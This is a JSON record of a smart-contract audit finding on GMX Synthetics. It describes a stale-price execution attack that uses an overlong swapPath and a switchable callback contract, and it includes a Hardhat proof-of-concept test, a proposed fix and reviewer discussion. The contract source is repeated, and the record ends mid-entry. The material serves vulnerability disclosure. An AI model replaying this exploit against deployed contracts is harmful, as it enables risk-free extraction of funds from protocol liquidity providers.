{
  "Title": "H-21: Creating an order of type MarketIncrease opens an attack vector where attacker can execute txs with stale prices by inputting a very extense swapPath",
  "Content": "# Issue H-21: Creating an order of type MarketIncrease opens an attack vector where attacker can execute txs with stale prices by inputting a very extense swapPath \n\nSource: https://github.com/sherlock-audit/2023-02-gmx-judging/issues/54 \n\n## Found by \nstopthecap\n\n## Summary\n\nThe vulnerability relies on the create order function: \n\n        function createOrder(\n        DataStore dataStore,\n        EventEmitter eventEmitter,\n        OrderVault orderVault,\n        IReferralStorage referralStorage,\n        address account,\n        BaseOrderUtils.CreateOrderParams memory params\n        ) external returns (bytes32) {\n        ReferralUtils.setTraderReferralCode(referralStorage, account, params.referralCode);\n\n        uint256 initialCollateralDeltaAmount;\n\n        address wnt = TokenUtils.wnt(dataStore);\n\n        bool shouldRecordSeparateExecutionFeeTransfer = true;\n\n        if (\n            params.orderType == Order.OrderType.MarketSwap ||\n            params.orderType == Order.OrderType.LimitSwap ||\n            params.orderType == Order.OrderType.MarketIncrease ||\n            params.orderType == Order.OrderType.LimitIncrease\n        ) {\n            initialCollateralDeltaAmount = orderVault.recordTransferIn(params.addresses.initialCollateralToken);\n            if (params.addresses.initialCollateralToken == wnt) {\n                if (initialCollateralDeltaAmount < params.numbers.executionFee) {\n                    revert InsufficientWntAmountForExecutionFee(initialCollateralDeltaAmount, params.numbers.executionFee);\n                }\n                initialCollateralDeltaAmount -= params.numbers.executionFee;\n                shouldRecordSeparateExecutionFeeTransfer = false;\n            }\n        } else if (\n            params.orderType == Order.OrderType.MarketDecrease ||\n            params.orderType == Order.OrderType.LimitDecrease ||\n            params.orderType == Order.OrderType.StopLossDecrease\n        ) {\n            initialCollateralDeltaAmount = params.numbers.initialCollateralDeltaAmount;\n        } else {\n            revert OrderTypeCannotBeCreated(params.orderType);\n        }\n\n        if (shouldRecordSeparateExecutionFeeTransfer) {\n            uint256 wntAmount = orderVault.recordTransferIn(wnt);\n            if (wntAmount < params.numbers.executionFee) {\n                revert InsufficientWntAmountForExecutionFee(wntAmount, params.numbers.executionFee);\n            }\n\n            GasUtils.handleExcessExecutionFee(\n                dataStore,\n                orderVault,\n                wntAmount,\n                params.numbers.executionFee\n            );\n        }\n\n        // validate swap path markets\n        MarketUtils.getEnabledMarkets(\n            dataStore,\n            params.addresses.swapPath\n        );\n\n        Order.Props memory order;\n\n        order.setAccount(account);\n        order.setReceiver(params.addresses.receiver);\n        order.setCallbackContract(params.addresses.callbackContract);\n        order.setMarket(params.addresses.market);\n        order.setInitialCollateralToken(params.addresses.initialCollateralToken);\n        order.setSwapPath(params.addresses.swapPath);\n        order.setOrderType(params.orderType);\n        order.setDecreasePositionSwapType(params.decreasePositionSwapType);\n        order.setSizeDeltaUsd(params.numbers.sizeDeltaUsd);\n        order.setInitialCollateralDeltaAmount(initialCollateralDeltaAmount);\n        order.setTriggerPrice(params.numbers.triggerPrice);\n        order.setAcceptablePrice(params.numbers.acceptablePrice);\n        order.setExecutionFee(params.numbers.executionFee);\n        order.setCallbackGasLimit(params.numbers.callbackGasLimit);\n        order.setMinOutputAmount(params.numbers.minOutputAmount);\n        order.setIsLong(params.isLong);\n        order.setShouldUnwrapNativeToken(params.shouldUnwrapNativeToken);\n\n        ReceiverUtils.validateReceiver(order.receiver());\n\n        if (order.initialCollateralDeltaAmount() == 0 && order.sizeDeltaUsd() == 0) {\n            revert BaseOrderUtils.EmptyOrder();\n        }\n\n        CallbackUtils.validateCallbackGasLimit(dataStore, order.callbackGasLimit());\n\n        uint256 estimatedGasLimit = GasUtils.estimateExecuteOrderGasLimit(dataStore, order);\n        GasUtils.validateExecutionFee(dataStore, estimatedGasLimit, order.executionFee());\n\n        bytes32 key = NonceUtils.getNextKey(dataStore);\n\n        order.touch();\n        OrderStoreUtils.set(dataStore, key, order);\n\n        OrderEventUtils.emitOrderCreated(eventEmitter, key, order);\n\n        return key;\n    }\n\nhttps://github.com/sherlock-audit/2023-02-gmx/blob/main/gmx-synthetics/contracts/order/OrderUtils.sol#L69\n\nSpecifically, on a marketIncrease OrderType. Executing an order type of marketIncrease opens an attack path where you can execute transactions with stale prices. \n\n## Vulnerability Detail\n\nThe way to achieve this, is by creating a market increase order and passing a very extensive swapPath in params:\n\n         BaseOrderUtils.CreateOrderParams memory params\n\n\n        struct CreateOrderParams {\n        CreateOrderParamsAddresses addresses;\n        CreateOrderParamsNumbers numbers;\n        Order.OrderType orderType;\n        Order.DecreasePositionSwapType decreasePositionSwapType;\n        bool isLong;\n        bool shouldUnwrapNativeToken;\n        bytes32 referralCode;\n       }\n\n           struct CreateOrderParamsAddresses {\n        address receiver;\n        address callbackContract;\n        address market;\n        address initialCollateralToken;\n        address[] swapPath;     //HEREE   <--------------------------------------------------------\n        }\n\n    The swap path has to be as long as it gets close to the gasLimit of the block.\n\n\nAfter calling marketIncrease close to gasLimit  then using the callback contract that you passed as a param in:\n\nhttps://github.com/sherlock-audit/2023-02-gmx/blob/main/gmx-synthetics/contracts/order/OrderUtils.sol#L114\n\n an exceeding the block.gasLimit in the callback.  \n\nAfter \"x\" amount of blocks, change the gasUsage on the fallback, just that the transaction executes at the prior price.\n\nPoC on how to execute the transaction with old pricing:\n\n    import { expect } from \"chai\";\n    import { mine } from \"@nomicfoundation/hardhat-network-helpers\";\n    import { OrderType, getOrderCount, getOrderKeys, createOrder, executeOrder, handleOrder } from \"../utils/order\";\n    import { expandDecimals, decimalToFloat } from \"../utils/math\";\n    import { deployFixture } from \"../utils/fixture\";\n     import { handleDeposit } from \"../utils/deposit\";\n    import { getPositionCount, getAccountPositionCount } from \"../utils/position\";\n\n    describe(\"Execute transaction with all prices\", () => {\n    let fixture,\n    user0,\n    user1,\n    user2,\n    reader,\n    dataStore,\n    ethUsdMarket,\n    ethUsdSpotOnlyMarket,\n    wnt,\n    usdc,\n    attackContract,\n    oracle,\n    depositVault,\n    exchangeRouter,\n    swapHandler,\n    executionFee;\n\n     beforeEach(async () => {\n      fixture = await deployFixture();\n\n        ({ user0, user1, user2 } = fixture.accounts);\n       ({\n      reader,\n      dataStore,\n      oracle,\n      depositVault,\n      ethUsdMarket,\n      ethUsdSpotOnlyMarket,\n      wnt,\n      usdc,\n      attackContract,\n      exchangeRouter,\n      swapHandler,\n      } = fixture.contracts);\n      ({ executionFee } = fixture.props);\n  \n       await handleDeposit(fixture, {\n        create: {\n        market: ethUsdMarket,\n        longTokenAmount: expandDecimals(10000000, 18),\n        shortTokenAmount: expandDecimals(10000000 * 5000, 6),\n      },\n       });\n        await handleDeposit(fixture, {\n      create: {\n        market: ethUsdSpotOnlyMarket,\n        longTokenAmount: expandDecimals(10000000, 18),\n        shortTokenAmount: expandDecimals(10000000 * 5000, 6),\n       },\n       });\n      });\n\n      it(\"Old price order execution\", async () => {\n      const path = [];\n     const UsdcBal = expandDecimals(50 * 1000, 6);\n     expect(await getOrderCount(dataStore)).eq(0);\n\n       for (let i = 0; i < 63; i++) {\n      if (i % 2 == 0) path.push(ethUsdMarket.marketToken);\n      else path.push(ethUsdSpotOnlyMarket.marketToken);\n       }\n   \n        const params = {\n        account: attackContract,\n         callbackContract: attackContract,\n        callbackGasLimit: 1900000,\n        market: ethUsdMarket,\n         minOutputAmount: 0,\n         initialCollateralToken: usdc, // Collateral will get swapped to ETH by the swapPath -- 50k/$5k = 10 ETH Collateral\n         initialCollateralDeltaAmount: UsdcBal,\n       swapPath: path,\n       sizeDeltaUsd: decimalToFloat(200 * 1000), // 4x leverage -- position size is 40 ETH\n       acceptablePrice: expandDecimals(5001, 12),\n        orderType: OrderType.MarketIncrease,\n        isLong: true,\n        shouldUnwrapNativeToken: false,\n        gasUsageLabel: \"createOrder\",\n         };\n\n      // Create a MarketIncrease order that will run out of gas doing callback\n      await createOrder(fixture, params);\n      expect(await getOrderCount(dataStore)).eq(1);\n      expect(await getAccountPositionCount(dataStore, attackContract.address)).eq(0);\n       expect(await getPositionCount(dataStore)).eq(0);\n        expect(await getAccountPositionCount(dataStore, attackContract.address)).eq(0);\n\n       await expect(executeOrder(fixture)).to.be.reverted;\n\n       await mine(50);\n\n       await attackContract.flipSwitch();\n\n      expect(await getOrderCount(dataStore)).eq(1);\n\n       await executeOrder(fixture, {\n      minPrices: [expandDecimals(5000, 4), expandDecimals(1, 6)],\n      maxPrices: [expandDecimals(5000, 4), expandDecimals(1, 6)],\n       });\n\n      expect(await getOrderCount(dataStore)).eq(0);\n      expect(await getAccountPositionCount(dataStore, attackContract.address)).eq(1);\n       expect(await getPositionCount(dataStore)).eq(1);\n\n       await handleOrder(fixture, {\n        create: {\n        account: attackContract,\n        market: ethUsdMarket,\n        initialCollateralToken: wnt,\n        initialCollateralDeltaAmount: 0,\n        sizeDeltaUsd: decimalToFloat(200 * 1000),\n        acceptablePrice: 6001,\n        orderType: OrderType.MarketDecrease,\n        isLong: true,\n        gasUsageLabel: \"orderHandler.createOrder\",\n        swapPath: [ethUsdMarket.marketToken],\n       },\n       execute: {\n        minPrices: [expandDecimals(6000, 4), expandDecimals(1, 6)],\n        maxPrices: [expandDecimals(6000, 4), expandDecimals(1, 6)],\n        gasUsageLabel: \"orderHandler.executeOrder\",\n      },\n      });\n\n     const WNTAfter = await wnt.balanceOf(attackContract.address);\n      const UsdcAfter = await usdc.balanceOf(attackContract.address);\n\n       expect(UsdcAfter).to.gt(\n      expandDecimals(100 * 1000, 6)\n        .mul(999)\n        .div(1000)\n      );\n      expect(UsdcAfter).to.lt(\n      expandDecimals(100 * 1000, 6)\n        .mul(1001)\n        .div(1000)\n     );\n      expect(WNTAfter).to.eq(0);\n     }).timeout(100000);\n\n## Impact\n\nThe attack would allow to make free trades in terms of risk. You can trade without any risk by conttroling when to execute the transaction\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-02-gmx/blob/main/gmx-synthetics/contracts/order/OrderUtils.sol#L50\n\n## Tool used\n\nManual Review\n\n## Recommendation\nThere need to be a way to cap the length of the path to control user input:\n\nuint y = 10;\nrequire(swapPath.length < y ,\"path too long\");\n\n\n\n## Discussion\n\n**hack3r-0m**\n\nEscalate for 10 USDC\n\nthis should be medium because owner set conservative limit via `ESTIMATED_GAS_FEE_MULTIPLIER_FACTOR` and completly prevent this.\n\n**sherlock-admin**\n\n > Escalate for 10 USDC\n> \n> this should be medium because owner set conservative limit via `ESTIMATED_GAS_FEE_MULTIPLIER_FACTOR` and completly prevent this.\n\nYou've created a valid escalation for 10 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**IllIllI000**\n\nThis issue is about being able to use the block.gaslimit, not anything having to do with the keeper gas estimation\n\n**hrishibhat**\n\nEscalation rejected\n\nThis is a valid issue\n\n**sherlock-admin**\n\n> Escalation rejected\n> \n> This is a valid issue\n\nThis issue's escalations have been rejected!\n\nWatsons who escalated this issue will have their escalation amount deducted from their next payout.\n\n**xvi10**\n\nFix in https://github.com/gmx-io/gmx-synthetics/commit/d4066840f925c43116eed3c2c83ae2e44be39eed#diff-f764a51a3af5d3117eeeff219951425f3ecc8cd15b742bb044afc7c73b03f4aaR2010\n\n",
  "Impact": "HIGH",
  "Source": "https://app.sherlock.xyz/audits/contests/6",
  "Code": [
    {
      "filename": "gmx-synthetics/contracts/order/OrderUtils.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\n\npragma solidity ^0.8.0;\n\nimport \"../data/DataStore.sol\";\nimport \"../data/Keys.sol\";\n\nimport \"./Order.sol\";\nimport \"./OrderVault.sol\";\nimport \"./OrderStoreUtils.sol\";\nimport \"./OrderEventUtils.sol\";\n\nimport \"../nonce/NonceUtils.sol\";\nimport \"../oracle/Oracle.sol\";\nimport \"../oracle/OracleUtils.sol\";\nimport \"../event/EventEmitter.sol\";\n\nimport \"./IncreaseOrderUtils.sol\";\nimport \"./DecreaseOrderUtils.sol\";\nimport \"./SwapOrderUtils.sol\";\nimport \"./BaseOrderUtils.sol\";\n\nimport \"../swap/SwapUtils.sol\";\n\nimport \"../gas/GasUtils.sol\";\nimport \"../callback/CallbackUtils.sol\";\n\nimport \"../utils/Array.sol\";\nimport \"../utils/ReceiverUtils.sol\";\nimport \"../referral/ReferralUtils.sol\";\n\n// @title OrderUtils\n// @dev Library for order functions\nlibrary OrderUtils {\n    using Order for Order.Props;\n    using Position for Position.Props;\n    using Price for Price.Props;\n    using Array for uint256[];\n\n    error OrderTypeCannotBeCreated(Order.OrderType orderType);\n    error OrderAlreadyFrozen();\n    error InsufficientWntAmountForExecutionFee(uint256 wntAmount, uint256 executionFee);\n\n    // @dev creates an order in the order store\n    // @param dataStore DataStore\n    // @param eventEmitter EventEmitter\n    // @param orderVault OrderVault\n    // @param account the order account\n    // @param params BaseOrderUtils.CreateOrderParams\n    function createOrder(\n        DataStore dataStore,\n        EventEmitter eventEmitter,\n        OrderVault orderVault,\n        IReferralStorage referralStorage,\n        address account,\n        BaseOrderUtils.CreateOrderParams memory params\n    ) external returns (bytes32) {\n        ReferralUtils.setTraderReferralCode(referralStorage, account, params.referralCode);\n\n        uint256 initialCollateralDeltaAmount;\n\n        address wnt = TokenUtils.wnt(dataStore);\n\n        bool shouldRecordSeparateExecutionFeeTransfer = true;\n\n        if (\n            params.orderType == Order.OrderType.MarketSwap ||\n            params.orderType == Order.OrderType.LimitSwap ||\n            params.orderType == Order.OrderType.MarketIncrease ||\n            params.orderType == Order.OrderType.LimitIncrease\n        ) {\n            initialCollateralDeltaAmount = orderVault.recordTransferIn(params.addresses.initialCollateralToken);\n            if (params.addresses.initialCollateralToken == wnt) {\n                if (initialCollateralDeltaAmount < params.numbers.executionFee) {\n                    revert InsufficientWntAmountForExecutionFee(initialCollateralDeltaAmount, params.numbers.executionFee);\n                }\n                initialCollateralDeltaAmount -= params.numbers.executionFee;\n                shouldRecordSeparateExecutionFeeTransfer = false;\n            }\n        } else if (\n            params.orderType == Order.OrderType.MarketDecrease ||\n            params.orderType == Order.OrderType.LimitDecrease ||\n            params.orderType == Order.OrderType.StopLossDecrease\n        ) {\n            initialCollateralDeltaAmount = params.numbers.initialCollateralDeltaAmount;\n        } else {\n            revert OrderTypeCannotBeCreated(params.orderType);\n        }\n\n        if (shouldRecordSeparateExecutionFeeTransfer) {\n            uint256 wntAmount = orderVault.recordTransferIn(wnt);\n            if (wntAmount < params.numbers.executionFee) {\n                revert InsufficientWntAmountForExecutionFee(wntAmount, params.numbers.executionFee);\n            }\n\n            GasUtils.handleExcessExecutionFee(\n                dataStore,\n                orderVault,\n                wntAmount,\n                params.numbers.executionFee\n            );\n        }\n\n        // validate swap path markets\n        MarketUtils.getEnabledMarkets(\n            dataStore,\n            params.addresses.swapPath\n        );\n\n        Order.Props memory order;\n\n        order.setAccount(account);\n        order.setReceiver(params.addresses.receiver);\n        order.setCallbackContract(params.addresses.callbackContract);\n        order.setMarket(params.addresses.market);\n        order.setInitialCollateralToken(params.addresses.initialCollateralToken);\n        order.setSwapPath(params.addresses.swapPath);\n        order.setOrderType(params.orderType);\n        order.setDecreasePositionSwapType(params.decreasePositionSwapType);\n        order.setSizeDeltaUsd(params.numbers.sizeDeltaUsd);\n        order.setInitialCollateralDeltaAmount(initialCollateralDeltaAmount);\n        order.setTriggerPrice(params.numbers.triggerPrice);\n        order.setAcceptablePrice(params.numbers.acceptablePrice);\n        order.setExecutionFee(params.numbers.executionFee);\n        order.setCallbackGasLimit(params.numbers.callbackGasLimit);\n        order.setMinOutputAmount(params.numbers.minOutputAmount);\n        order.setIsLong(params.isLong);\n        order.setShouldUnwrapNativeToken(params.shouldUnwrapNativeToken);\n\n        ReceiverUtils.validateReceiver(order.receiver());\n\n        if (order.initialCollateralDeltaAmount() == 0 && order.sizeDeltaUsd() == 0) {\n            revert BaseOrderUtils.EmptyOrder();\n        }\n\n        CallbackUtils.validateCallbackGasLimit(dataStore, order.callbackGasLimit());\n\n        uint256 estimatedGasLimit = GasUtils.estimateExecuteOrderGasLimit(dataStore, order);\n        GasUtils.validateExecutionFee(dataStore, estimatedGasLimit, order.executionFee());\n\n        bytes32 key = NonceUtils.getNextKey(dataStore);\n\n        order.touch();\n        OrderStoreUtils.set(dataStore, key, order);\n\n        OrderEventUtils.emitOrderCreated(eventEmitter, key, order);\n\n        return key;\n    }\n\n    // @dev executes an order\n    // @param params BaseOrderUtils.ExecuteOrderParams\n    function executeOrder(BaseOrderUtils.ExecuteOrderParams memory params) external {\n        BaseOrderUtils.validateNonEmptyOrder(params.order);\n\n        BaseOrderUtils.setExactOrderPrice(\n            params.contracts.oracle,\n            params.market.indexToken,\n            params.order.orderType(),\n            params.order.triggerPrice(),\n            params.order.isLong()\n        );\n\n        processOrder(params);\n\n        OrderEventUtils.emitOrderExecuted(params.contracts.eventEmitter, params.key);\n\n        CallbackUtils.afterOrderExecution(params.key, params.order);\n\n        // the order.executionFee for liquidation / adl orders is zero\n        // gas costs for liquidations / adl is subsidised by the treasury\n        GasUtils.payExecutionFee(\n            params.contracts.dataStore,\n            params.contracts.orderVault,\n            params.order.executionFee(),\n            params.startingGas,\n            params.keeper,\n            params.order.account()\n        );\n    }\n\n    // @dev process an order execution\n    // @param params BaseOrderUtils.ExecuteOrderParams\n    function processOrder(BaseOrderUtils.ExecuteOrderParams memory params) internal {\n        if (BaseOrderUtils.isIncreaseOrder(params.order.orderType())) {\n            IncreaseOrderUtils.processOrder(params);\n            return;\n        }\n\n        if (BaseOrderUtils.isDecreaseOrder(params.order.orderType())) {\n            DecreaseOrderUtils.processOrder(params);\n            return;\n        }\n\n        if (BaseOrderUtils.isSwapOrder(params.order.orderType())) {\n            SwapOrderUtils.processOrder(params);\n            return;\n        }\n\n        BaseOrderUtils.revertUnsupportedOrderType();\n    }\n\n    // @dev cancels an order\n    // @param dataStore DataStore\n    // @param eventEmitter EventEmitter\n    // @param orderVault OrderVault\n    // @param key the key of the order to cancel\n    // @param keeper the keeper sending the transaction\n    // @param startingGas the starting gas of the transaction\n    // @param reason the reason for cancellation\n    function cancelOrder(\n        DataStore dataStore,\n        EventEmitter eventEmitter,\n        OrderVault orderVault,\n        bytes32 key,\n        address keeper,\n        uint256 startingGas,\n        string memory reason,\n        bytes memory reasonBytes\n    ) external {\n        Order.Props memory order = OrderStoreUtils.get(dataStore, key);\n        BaseOrderUtils.validateNonEmptyOrder(order);\n\n        if (BaseOrderUtils.isIncreaseOrder(order.orderType()) || BaseOrderUtils.isSwapOrder(order.orderType())) {\n            if (order.initialCollateralDeltaAmount() > 0) {\n                orderVault.transferOut(\n                    order.initialCollateralToken(),\n                    order.account(),\n                    order.initialCollateralDeltaAmount(),\n                    order.shouldUnwrapNativeToken()\n                );\n            }\n        }\n\n        OrderStoreUtils.remove(dataStore, key, order.account());\n\n        OrderEventUtils.emitOrderCancelled(eventEmitter, key, reason, reasonBytes);\n\n        CallbackUtils.afterOrderCancellation(key, order);\n\n        GasUtils.payExecutionFee(\n            dataStore,\n            orderVault,\n            order.executionFee(),\n            startingGas,\n            keeper,\n            order.account()\n        );\n    }\n\n    // @dev freezes an order\n    // @param dataStore DataStore\n    // @param eventEmitter EventEmitter\n    // @param orderVault OrderVault\n    // @param key the key of the order to freeze\n    // @param keeper the keeper sending the transaction\n    // @param startingGas the starting gas of the transaction\n    // @param reason the reason the order was frozen\n    function freezeOrder(\n        DataStore dataStore,\n        EventEmitter eventEmitter,\n        OrderVault orderVault,\n        bytes32 key,\n        address keeper,\n        uint256 startingGas,\n        string memory reason,\n        bytes memory reasonBytes\n    ) external {\n        Order.Props memory order = OrderStoreUtils.get(dataStore, key);\n        BaseOrderUtils.validateNonEmptyOrder(order);\n\n        if (order.isFrozen()) {\n            revert OrderAlreadyFrozen();\n        }\n\n        uint256 executionFee = order.executionFee();\n\n        order.setExecutionFee(0);\n        order.setIsFrozen(true);\n        OrderStoreUtils.set(dataStore, key, order);\n\n        OrderEventUtils.emitOrderFrozen(eventEmitter, key, reason, reasonBytes);\n\n        CallbackUtils.afterOrderFrozen(key, order);\n\n        GasUtils.payExecutionFee(\n            dataStore,\n            orderVault,\n            executionFee,\n            startingGas,\n            keeper,\n            order.account()\n        );\n\n    }\n}"
    },
    {
      "filename": "gmx-synthetics/contracts/order/OrderUtils.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\n\npragma solidity ^0.8.0;\n\nimport \"../data/DataStore.sol\";\nimport \"../data/Keys.sol\";\n\nimport \"./Order.sol\";\nimport \"./OrderVault.sol\";\nimport \"./OrderStoreUtils.sol\";\nimport \"./OrderEventUtils.sol\";\n\nimport \"../nonce/NonceUtils.sol\";\nimport \"../oracle/Oracle.sol\";\nimport \"../oracle/OracleUtils.sol\";\nimport \"../event/EventEmitter.sol\";\n\nimport \"./IncreaseOrderUtils.sol\";\nimport \"./DecreaseOrderUtils.sol\";\nimport \"./SwapOrderUtils.sol\";\nimport \"./BaseOrderUtils.sol\";\n\nimport \"../swap/SwapUtils.sol\";\n\nimport \"../gas/GasUtils.sol\";\nimport \"../callback/CallbackUtils.sol\";\n\nimport \"../utils/Array.sol\";\nimport \"../utils/ReceiverUtils.sol\";\nimport \"../referral/ReferralUtils.sol\";\n\n// @title OrderUtils\n// @dev Library for order functions\nlibrary OrderUtils {\n    using Order for Order.Props;\n    using Position for Position.Props;\n    using Price for Price.Props;\n    using Array for uint256[];\n\n    error OrderTypeCannotBeCreated(Order.OrderType orderType);\n    error OrderAlreadyFrozen();\n    error InsufficientWntAmountForExecutionFee(uint256 wntAmount, uint256 executionFee);\n\n    // @dev creates an order in the order store\n    // @param dataStore DataStore\n    // @param eventEmitter EventEmitter\n    // @param orderVault OrderVault\n    // @param account the order account\n    // @param params BaseOrderUtils.CreateOrderParams\n    function createOrder(\n        DataStore dataStore,\n        EventEmitter eventEmitter,\n        OrderVault orderVault,\n        IReferralStorage referralStorage,\n        address account,\n        BaseOrderUtils.CreateOrderParams memory params\n    ) external returns (bytes32) {\n        ReferralUtils.setTraderReferralCode(referralStorage, account, params.referralCode);\n\n        uint256 initialCollateralDeltaAmount;\n\n        address wnt = TokenUtils.wnt(dataStore);\n\n        bool shouldRecordSeparateExecutionFeeTransfer = true;\n\n        if (\n            params.orderType == Order.OrderType.MarketSwap ||\n            params.orderType == Order.OrderType.LimitSwap ||\n            params.orderType == Order.OrderType.MarketIncrease ||\n            params.orderType == Order.OrderType.LimitIncrease\n        ) {\n            initialCollateralDeltaAmount = orderVault.recordTransferIn(params.addresses.initialCollateralToken);\n            if (params.addresses.initialCollateralToken == wnt) {\n                if (initialCollateralDeltaAmount < params.numbers.executionFee) {\n                    revert InsufficientWntAmountForExecutionFee(initialCollateralDeltaAmount, params.numbers.executionFee);\n                }\n                initialCollateralDeltaAmount -= params.numbers.executionFee;\n                shouldRecordSeparateExecutionFeeTransfer = false;\n            }\n        } else if (\n            params.orderType == Order.OrderType.MarketDecrease ||\n            params.orderType == Order.OrderType.LimitDecrease ||\n            params.orderType == Order.OrderType.StopLossDecrease\n        ) {\n            initialCollateralDeltaAmount = params.numbers.initialCollateralDeltaAmount;\n        } else {\n            revert OrderTypeCannotBeCreated(params.orderType);\n        }\n\n        if (shouldRecordSeparateExecutionFeeTransfer) {\n            uint256 wntAmount = orderVault.recordTransferIn(wnt);\n            if (wntAmount < params.numbers.executionFee) {\n                revert InsufficientWntAmountForExecutionFee(wntAmount, params.numbers.executionFee);\n            }\n\n            GasUtils.handleExcessExecutionFee(\n                dataStore,\n                orderVault,\n                wntAmount,\n                params.numbers.executionFee\n            );\n        }\n\n        // validate swap path markets\n        MarketUtils.getEnabledMarkets(\n            dataStore,\n            params.addresses.swapPath\n        );\n\n        Order.Props memory order;\n\n        order.setAccount(account);\n        order.setReceiver(params.addresses.receiver);\n        order.setCallbackContract(params.addresses.callbackContract);\n        order.setMarket(params.addresses.market);\n        order.setInitialCollateralToken(params.addresses.initialCollateralToken);\n        order.setSwapPath(params.addresses.swapPath);\n        order.setOrderType(params.orderType);\n        order.setDecreasePositionSwapType(params.decreasePositionSwapType);\n        order.setSizeDeltaUsd(params.numbers.sizeDeltaUsd);\n        order.setInitialCollateralDeltaAmount(initialCollateralDeltaAmount);\n        order.setTriggerPrice(params.numbers.triggerPrice);\n        order.setAcceptablePrice(params.numbers.acceptablePrice);\n        order.setExecutionFee(params.numbers.executionFee);\n        order.setCallbackGasLimit(params.numbers.callbackGasLimit);\n        order.setMinOutputAmount(params.numbers.minOutputAmount);\n        order.setIsLong(params.isLong);\n        order.setShouldUnwrapNativeToken(params.shouldUnwrapNativeToken);\n\n        ReceiverUtils.validateReceiver(order.receiver());\n\n        if (order.initialCollateralDeltaAmount() == 0 && order.sizeDeltaUsd() == 0) {\n            revert BaseOrderUtils.EmptyOrder();\n        }\n\n        CallbackUtils.validateCallbackGasLimit(dataStore, order.callbackGasLimit());\n\n        uint256 estimatedGasLimit = GasUtils.estimateExecuteOrderGasLimit(dataStore, order);\n        GasUtils.validateExecutionFee(dataStore, estimatedGasLimit, order.executionFee());\n\n        bytes32 key = NonceUtils.getNextKey(dataStore);\n\n        order.touch();\n        OrderStoreUtils.set(dataStore, key, order);\n\n        OrderEventUtils.emitOrderCreated(eventEmitter, key, order);\n\n        return key;\n    }\n\n    // @dev executes an order\n    // @param params BaseOrderUtils.ExecuteOrderParams\n    function executeOrder(BaseOrderUtils.ExecuteOrderParams memory params) external {\n        BaseOrderUtils.validateNonEmptyOrder(params.order);\n\n        BaseOrderUtils.setExactOrderPrice(\n            params.contracts.oracle,\n            params.market.indexToken,\n            params.order.orderType(),\n            params.order.triggerPrice(),\n            params.order.isLong()\n        );\n\n        processOrder(params);\n\n        OrderEventUtils.emitOrderExecuted(params.contracts.eventEmitter, params.key);\n\n        CallbackUtils.afterOrderExecution(params.key, params.order);\n\n        // the order.executionFee for liquidation / adl orders is zero\n        // gas costs for liquidations / adl is subsidised by the treasury\n        GasUtils.payExecutionFee(\n            params.contracts.dataStore,\n            params.contracts.orderVault,\n            params.order.executionFee(),\n            params.startingGas,\n            params.keeper,\n            params.order.account()\n        );\n    }\n\n    // @dev process an order execution\n    // @param params BaseOrderUtils.ExecuteOrderParams\n    function processOrder(BaseOrderUtils.ExecuteOrderParams memory params) internal {\n        if (BaseOrderUtils.isIncreaseOrder(params.order.orderType())) {\n            IncreaseOrderUtils.processOrder(params);\n            return;\n        }\n\n        if (BaseOrderUtils.isDecreaseOrder(params.order.orderType())) {\n            DecreaseOrderUtils.processOrder(params);\n            return;\n        }\n\n        if (BaseOrderUtils.isSwapOrder(params.order.orderType())) {\n            SwapOrderUtils.processOrder(params);\n            return;\n        }\n\n        BaseOrderUtils.revertUnsupportedOrderType();\n    }\n\n    // @dev cancels an order\n    // @param dataStore DataStore\n    // @param eventEmitter EventEmitter\n    // @param orderVault OrderVault\n    // @param key the key of the order to cancel\n    // @param keeper the keeper sending the transaction\n    // @param startingGas the starting gas of the transaction\n    // @param reason the reason for cancellation\n    function cancelOrder(\n        DataStore dataStore,\n        EventEmitter eventEmitter,\n        OrderVault orderVault,\n        bytes32 key,\n        address keeper,\n        uint256 startingGas,\n        string memory reason,\n        bytes memory reasonBytes\n    ) external {\n        Order.Props memory order = OrderStoreUtils.get(dataStore, key);\n        BaseOrderUtils.validateNonEmptyOrder(order);\n\n        if (BaseOrderUtils.isIncreaseOrder(order.orderType()) || BaseOrderUtils.isSwapOrder(order.orderType())) {\n            if (order.initialCollateralDeltaAmount() > 0) {\n                orderVault.transferOut(\n                    order.initialCollateralToken(),\n                    order.account(),\n                    order.initialCollateralDeltaAmount(),\n                    order.shouldUnwrapNativeToken()\n                );\n            }\n        }\n\n        OrderStoreUtils.remove(dataStore, key, order.account());\n\n        OrderEventUtils.emitOrderCancelled(eventEmitter, key, reason, reasonBytes);\n\n        CallbackUtils.afterOrderCancellation(key, order);\n\n        GasUtils.payExecutionFee(\n            dataStore,\n            orderVault,\n            order.executionFee(),\n            startingGas,\n            keeper,\n            order.account()\n        );\n    }\n\n    // @dev freezes an order\n    // @param dataStore DataStore\n    // @param eventEmitter EventEmitter\n    // @param orderVault OrderVault\n    // @param key the key of the order to freeze\n    // @param keeper the keeper sending the transaction\n    // @param startingGas the starting gas of the transaction\n    // @param reason the reason the order was frozen\n    function freezeOrder(\n        DataStore dataStore,\n        EventEmitter eventEmitter,\n        OrderVault orderVault,\n        bytes32 key,\n        address keeper,\n        uint256 startingGas,\n        string memory reason,\n        bytes memory reasonBytes\n    ) external {\n        Order.Props memory order = OrderStoreUtils.get(dataStore, key);\n        BaseOrderUtils.validateNonEmptyOrder(order);\n\n        if (order.isFrozen()) {\n            revert OrderAlreadyFrozen();\n        }\n\n        uint256 executionFee = order.executionFee();\n\n        order.setExecutionFee(0);\n        order.setIsFrozen(true);\n        OrderStoreUtils.set(dataStore, key, order);\n\n        OrderEventUtils.emitOrderFrozen(eventEmitter, key, reason, reasonBytes);\n\n        CallbackUtils.afterOrderFrozen(key, order);\n\n        GasUtils.payExecutionFee(\n            dataStore,\n            orderVault,\n            executionFee,\n            startingGas,\n            keeper,\n            order.account()\n        );\n\n    }\n}"
    },
    {
      "filename": "gmx-synthetics/contracts/order/OrderUtils.sol",
